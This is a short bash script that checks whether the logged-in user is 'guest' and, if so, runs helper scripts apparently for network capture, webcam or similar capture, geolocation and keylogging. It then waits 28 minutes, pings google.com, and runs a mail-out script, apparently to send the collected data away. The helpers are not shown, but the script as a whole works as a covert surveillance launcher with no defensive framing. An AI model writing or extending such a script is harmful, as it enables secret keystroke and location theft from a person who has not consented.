#!/bin/bash
if [ $(who | awk '{print $1}') == guest ]
then
        network.sh
        wc.sh
        geolocation.py
        keylog.py
        sleep 28m && ping -c 1 google.com > /dev/null
        STATUS=$?
        if [[ $STATUS == 0 ]]; then mailout.sh; fi
fi
